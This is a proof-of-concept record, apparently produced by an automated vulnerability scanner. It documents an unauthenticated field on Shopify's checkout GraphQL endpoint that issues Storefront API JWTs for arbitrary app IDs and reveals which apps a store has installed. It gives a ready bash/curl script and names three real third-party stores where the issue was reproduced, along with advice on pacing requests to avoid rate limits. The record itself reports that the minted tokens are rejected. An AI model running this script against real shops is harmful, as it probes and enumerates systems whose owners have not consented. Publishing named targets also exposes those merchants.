# Shopify /checkouts/unstable/graphql extensionApiTokens 字段级未鉴权：零凭据为任意第三方 appId 铸造 Storefront API JWT + 按店扩展安装 oracle

- **code**: shopify-checkouts-unstable-graphql-extensionapitokens-unauth
- **kind**: poc
- **category**: auth-bypass
- **component**: Shopify Checkout Web GraphQL（/checkouts/unstable/graphql，Query.extensionApiTokens）
- **severity**: medium
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 三次独立复现，均为零 Cookie / 无 X-Checkout-One-Session-Token / 无 X-Checkout-Web-Build-Id：
① task#7（2026-11-11 19:50–20:04 UTC，finding_id=158，bash+curl）：www.thegamecollection.net（sid=92537913668）与 collect.thegamecollection.net（sid=87370006865）POST /checkouts/unstable/graphql extensionApiTokens(appId:gid://shopify/App/3373963 / 152456331265) → HTTP 200 + storefrontApi.token（claims sub=appId、sid=shopId、cid=580111、exp=+1h）；同端点 {session{__typename}} → INVALID_SESSION_TOKEN；未安装 appId → null（按店独立 oracle）；铸出 token 打公开 /api/graphql（自有域/myshopify/2026-04/2026-07/unstable/Origin 变体）一律 401 UNAUTHORIZED，匿名同查询 200，确认影响上限为“凭据铸造 + 安装枚举”。原始响应落盘 /opt/artex/data/tasks/7/i2468/。
② task#9（2026-11-11 UTC，finding_id=167，python requests，经平台记录代理，单线程间隔 2.8s）：retro-refresh.com（店铺 103967621452）extensionApiTokens(appId=gid://shopify/App/580111) → HTTP 200，token claims 解码 {"iss":"shopify","sub":580111,"cid":580111,"sid":103967621452}、exp-iat=3600，expiresAt=2026-11-11T22:06:04Z；同端点 {session{__typename}} → {"errors":[{"message":"Invalid session token.","extensions":{"code":"INVALID_SESSION_TOKEN"},"path":["session"]}]}（证明字段级鉴权豁免而非端点整体开放）；appId=999999999/65304788993/34269560833 → {"extensionApiTokens":null}（按店安装 oracle）；铸出 token 以 X-Shopify-Storefront-Access-Token 与 Authorization: Bearer 两种方式打 POST /api/graphql {shop{name myshopifyDomain}} → 401 {"errors":[{"message":"","extensions":{"code":"UNAUTHORIZED"}}]}，同请求无 token 匿名 → 200（排除 API 整体不可用）。原始响应落盘 /opt/artex/data/tasks/9/i2764/。
结论：三家独立 Shopify 店同构复现，判定为字段级未鉴权（auth-validate control），严重度 medium，影响限于未认证签发 Storefront JWT + checkout 扩展安装存在性枚举。
- **path**: pocs/shopify-checkouts-unstable-graphql-extensionapitokens-unauth/poc.sh
- **tags**: shopify, graphql, auth-bypass, extensionApiTokens, checkout, jwt-mint, storefront-api, oracle, unauthenticated
- **created_at**: 2026-11-11T20:10:47.017Z
- **engine**: https://www.thegamecollection.net; https://collect.thegamecollection.net; https://retro-refresh.com
- **found_by**: vuln-scan

## 描述

Shopify 店面 checkout web GraphQL 端点 /checkouts/unstable/graphql 的 Query.extensionApiTokens 字段缺少鉴权校验：无需 Cookie、无需 X-Checkout-One-Session-Token、无需 checkout 会话/build-id，即可提交任意第三方 appId（gid://shopify/App/<id>），由 Shopify 服务端签发对应 storefrontApi JWT（HS256，claims 含 sub=appId、sid=shopId、cid=580111、exp=+1h）。同端点其它字段（如 session）仍强制会话，证明是字段级豁免。对未安装该 app 的店返回 null，可作按店 checkout 扩展安装存在性 oracle。铸造出的 token 在公开 Storefront API 上被拒（401 UNAUTHORIZED），实际数据面消费方未证实，影响为未认证凭据铸造 + 安装枚举。已在三台独立 Shopify 店（thegamecollection.net www/collect、retro-refresh.com）复现，属平台级通病。

## 用法

```
前置：目标是 Shopify 托管店（任意店域/自定义域），能访问 HTTPS；零凭据；单线程、请求间隔 ≥3s（实测约 30+ 次会触发 429）。
1) 零凭据铸造（关键请求，无任何 Cookie/会话头）：
  curl -sk -X POST 'https://<shop>/checkouts/unstable/graphql' -H 'Content-Type: application/json' -H 'Accept: application/json' --data '{"query":"query E($appId:ID!){extensionApiTokens(appId:$appId){storefrontApi{token expiresAt}}}","variables":{"appId":"gid://shopify/App/3373963"}}'
  → 200 {"data":{"extensionApiTokens":{"storefrontApi":{"token":"eyJ...","expiresAt":"..."}}}}；token 为三段 JWT，中间段 base64url 解码可见 sub(数字 appId)/sid(shopId)/cid 580111/exp=iat+3600。
2) 判据（必做对照）：同端点 {"query":"{session{__typename}}"} 无会话 → errors[].extensions.code = INVALID_SESSION_TOKEN；两者一正一反，排除“端点整体开放”。
3) oracle：appId=gid://shopify/App/999999999 → {"extensionApiTokens":null}；把 A 店已安装的 appId 拿去 B 店查同样 null（各店独立），返回 token 即该店安装了该 app。
4) 影响上限核验：拿铸出的 token 打 POST https://<shop>/api/graphql，Header X-Shopify-Storefront-Access-Token:<jwt>（或 Authorization: Bearer）查 {shop{name myshopifyDomain}} → 401 {"errors":[{"message":"","extensions":{"code":"UNAUTHORIZED"}}]}；换 myshopify 域、多 API 版本（2026-04/2026-07/unstable）、Origin 变体均 401。别把“拿到 token”直接写成“可读数据”。
失败常见原因：非 Shopify 店/路径 404 或 HTML；被 WAF/限速返回 429（加大间隔、换时段）；字段已修补（返回 INVALID_SESSION_TOKEN 或 field 不存在于 schema）；传 appId 格式错误（必须是 gid://shopify/App/<纯数字>）。
```

## 正文

```
#!/usr/bin/env bash
# Shopify /checkouts/unstable/graphql :: Query.extensionApiTokens 未认证铸造 Storefront API JWT
# 实测：2026-11-11 task#7（www / collect 两独立店）+ task#9（retro-refresh.com）均复现；
#       零 Cookie、零 checkout 会话头、零 build-id。
# 注意：单线程、请求间隔 >=3s；实测约 30+ 请求触发 429。
set -u

SHOP="${1:-https://<shop>}"          # 例：https://www.example.com（Shopify 托管店自定义域）
APP_ID="${2:-gid://shopify/App/3373963}"   # gid://shopify/App/<纯数字>
EP="${SHOP%/}/checkouts/unstable/graphql"

hr(){ printf '\n===== %s =====\n' "$1"; }

hr "1) 零凭据铸造（无 Cookie / 无 session token / 无 build-id）"
curl -sk -X POST "$EP" \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json' \
  --data "{\"query\":\"query E(\$appId:ID!){extensionApiTokens(appId:\$appId){storefrontApi{token expiresAt}}}\",\"variables\":{\"appId\":\"${APP_ID}\"}}"
echo

hr "2) 判据对照：同端点其它字段强制会话（应返回 INVALID_SESSION_TOKEN）"
curl -sk -X POST "$EP" \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json' \
  --data '{"query":"{session{__typename}}"}'
echo

hr "3) 安装存在性 oracle：未安装 appId 应返回 null"
curl -sk -X POST "$EP" \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json' \
  --data '{"query":"query E($appId:ID!){extensionApiTokens(appId:$appId){storefrontApi{token expiresAt}}}","variables":{"appId":"gid://shopify/App/999999999"}}'
echo

hr "4) JWT claims 解码（export TOKEN=<第1步的 token> 后运行）"
python3 - <<'EOF'
import base64, json, os
tok = os.environ.get('TOKEN', '').strip()
if not tok:
    raise SystemExit('先 export TOKEN=<第1步的 token>')
p = tok.split('.')[1]
p += '=' * (-len(p) % 4)
claims = json.loads(base64.urlsafe_b64decode(p))
# 期望：iss=shopify, sub=<appId 数字>, sid=<shopId>, cid=580111, exp-iat=3600
print(json.dumps(claims, indent=2, ensure_ascii=False))
EOF

hr "5) 影响上限核验：铸出的 token 不应被公开 Storefront API 接受（预期 401 UNAUTHORIZED）"
cat <<'NOTE'
TOKEN='<第1步 token>'
curl -sk -X POST "${SHOP%/}/api/graphql" \
  -H 'Content-Type: application/json' \
  -H "X-Shopify-Storefront-Access-Token: ${TOKEN}" \
  --data '{"query":"{shop{name myshopifyDomain}}"}'
# 换 Authorization: Bearer / myshopify 主机 / 2026-04、2026-07、unstable 版本同样应 401。
# 若无 token 匿名同查询返回 200 —— 用来排除“该店 Storefront API 整体不可用”。
NOTE

# ---- 判据汇总 ----
# 成立：第1步 200 且返回 storefrontApi.token；第2步同端点报 INVALID_SESSION_TOKEN；第3步 null。
# 非漏洞：第1步即报 INVALID_SESSION_TOKEN / 字段不在 schema / 401。
# 影响边界：token 可被铸造 + 安装枚举，但公开 Storefront API 拒收（401），数据面消费方未证实。
```
